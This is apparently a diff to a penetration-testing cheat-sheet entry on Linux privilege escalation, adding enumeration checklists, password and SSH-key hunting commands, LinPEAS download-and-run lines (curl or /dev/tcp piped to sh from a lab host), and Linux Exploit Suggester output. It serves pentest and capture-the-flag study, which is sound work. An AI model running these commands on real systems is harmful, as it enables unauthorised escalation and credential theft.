@@ -4,33 +4,49 @@ functions:
     - description: Simplistic and standard checklist for linux privilege escalation, in no particular order
       code: |
         Feel free to copy paste the entire listing below
-        Standard:
-        - [ ] whoami
-        - [ ] id
-        - [ ] cat /etc/passwd
-        - [ ] cat /etc/group
-        - [ ] hostname
+        System Info Enum:
+        - [ ] uname -a
         - [ ] cat /etc/issue
         - [ ] cat /etc/*-release
         - [ ] cat /proc/version
         - [ ] lsb_release -a
-        - [ ] env
-        - [ ] sudo -l
-        - [ ] uname -a
         - [ ] ps aux
+        - [ ] lscpu
+        - [ ] env
+        - [ ] echo $PATH
+        - [ ] sudo -l
+        - [ ] hostname
+        User Enum:
+        - [ ] whoami
+        - [ ] id
+        - [ ] cat /etc/passwd
+        - [ ] cat /etc/group
+        - [ ] history
+
+        Network Enum:
         - [ ] ip a
         - [ ] ifconfig
         - [ ] /sbin/route
         - [ ] netstat -plant
+
+        Task Scheduling:
         - [ ] cat /etc/crontab
         - [ ] grep "CRON" /var/log/cron.log
+        - [ ] process momintoring (below script)
+
+        Password Hunting:
+        - [ ] grep --color=auto -rnw '/' -ie "PASSWORD=" 2>/dev/null
+        - [ ] locate pass | more
+        - [ ] find / -name id_rsa 2>/dev/null
+        - [ ] find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+
         - [ ] dpkg -l
         - [ ] mount
         - [ ] cat /etc/fstab
         - [ ] ssh -V
         - [ ] /bin/lsblk
         - [ ] lsmod
-        - [ ] echo $PATH
+
 
         File Permission Searching:
         - [ ] find / -type f -perm -2 2>/dev/null | grep -v "^/proc/"                     #world writable
@@ -57,7 +73,49 @@ functions:
           old_process=$new_process
         done
 
+    - description: LinPeas
+      code: |
+        curl http://10.10.10.10/linpeas.sh | sh
+        cd /tmp; wget http://10.10.10.10/linpeas.sh && sh linpeas.sh
+
+        sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
+        cat < /dev/tcp/10.10.10.10/80 | sh #Victim
+
+        # Output to file
+        ./linpeas.sh -a > /dev/shm/linpeas.txt
+
+    - description: Linux Exploit Suggester
+      code: |
+        perl linux-exploit-suggester.pl
+
+          #############################
+            Linux Exploit Suggester 2
+          #############################
+
+          Local Kernel: 2.6.32
+          Searching 72 exploits...
+
+          Possible Exploits
+          [1] american-sign-language
+              CVE-2010-4347
+              Source: http://www.securityfocus.com/bid/45408
+          [2] can_bcm
+              CVE-2010-2959
+              Source: http://www.exploit-db.com/exploits/14814
+
+        ...
+        ...
+
+        Use the -k flag to manually enter a wildcard for the kernel/operating system release version.
+        perl linux-exploit-suggester.pl -k 3
+
+
+
 resources: |
   https://github.com/jondonas/linux-exploit-suggester-2/blob/master/linux-exploit-suggester-2.pl
+  https://github.com/SecWiki/linux-kernel-exploits
+  https://github.com/lucyoa/kernel-exploits
+  https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+
 ---
 
